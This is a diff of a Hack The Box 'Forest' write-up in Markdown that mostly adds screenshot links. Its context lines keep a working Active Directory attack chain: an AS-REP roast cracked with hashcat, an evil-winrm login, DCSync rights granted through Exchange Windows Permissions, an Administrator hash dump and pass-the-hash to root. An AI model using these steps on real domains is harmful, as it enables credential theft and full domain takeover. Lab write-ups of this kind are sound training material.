@@ -174,7 +174,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:db0d947d2ac3b490e965a58f0f50b14d$...
 [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
-
+![Description](/assets/images/f1.png)
 **svc-alfresco** has pre-authentication disabled — hash obtained.
 
 ---
@@ -184,7 +184,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:db0d947d2ac3b490e965a58f0f50b14d$...
 ```bash
 hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
 ```
-
+![Description](/assets/images/f2.png)
 ```
 $krb5asrep$23$svc-alfresco...[hash]...:s3rvice
 ```
@@ -201,7 +201,7 @@ nxc winrm 10.129.39.206 -u 'svc-alfresco' -p 's3rvice'
 
 evil-winrm -i 10.129.39.206 -u 'svc-alfresco' -p 's3rvice'
 ```
-
+![Description](/assets/images/f4.png)
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
 ccbf84e216fd4d4427c80be3bcccec2b
@@ -224,23 +224,7 @@ bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.39.206 
 
 Imported the generated JSON files into BloodHound and using pathfinding, was able to find the shortes oath to domain admin from svc-alfresco.
 
-**The path:**
-
-```
-SVC-ALFRESCO
-    ↓ MemberOf
-SERVICE ACCOUNTS
-    ↓ MemberOf
-PRIVILEGED IT ACCOUNTS
-    ↓ MemberOf
-ACCOUNT OPERATORS         ← Can add members to groups!
-    ↓ GenericAll
-EXCHANGE WINDOWS PERMISSIONS
-    ↓ WriteDACL
-HTB.LOCAL (Domain)        ← DCSync rights here!
-    ↓
-DOMAIN ADMINS
-```
+![Description](/assets/images/f5.png)
 
 ---
 
@@ -259,6 +243,7 @@ With DCSync rights, we can dump the Administrator hash without
 touching LSASS.
 
 ---
+![Description](/assets/images/f7.png)
 
 ### Creating a New User (Token Issue Workaround)
 
@@ -269,7 +254,7 @@ recognize the new rights in the existing session.
 
 The fix:  I created a brand new user. Their first authentication will
 include the Exchange Windows Permissions group membership from the start.
-
+![Description](/assets/images/f9.png)
 ```powershell
 # In evil-winrm (Account Operators can create domain users!)
 net user 0x5h4q Password123! /add /domain
@@ -283,7 +268,7 @@ net group "Exchange Windows Permissions"
 ```
 
 ---
-
+![Description](/assets/images/f8.png)
 ### Granting DCSync Rights
 
 ```bash
@@ -313,7 +298,7 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 **Administrator NTLM:** `32693b11e6aa90eb43d32c72a07ceea6`
 
 ---
-
+![Description](/assets/images/f10.png)
 ### Pass-the-Hash → Root
 
 ```bash
@@ -326,7 +311,7 @@ c0ad2208998ea59cc865d0c034434108
 ```
 
 **Root Flag:** `c0ad2208998ea59cc865d0c034434108` ✅
-
+![Description](/assets/images/f11.png)
 Domain pwned.
 
 ## The Token Refresh Problem.
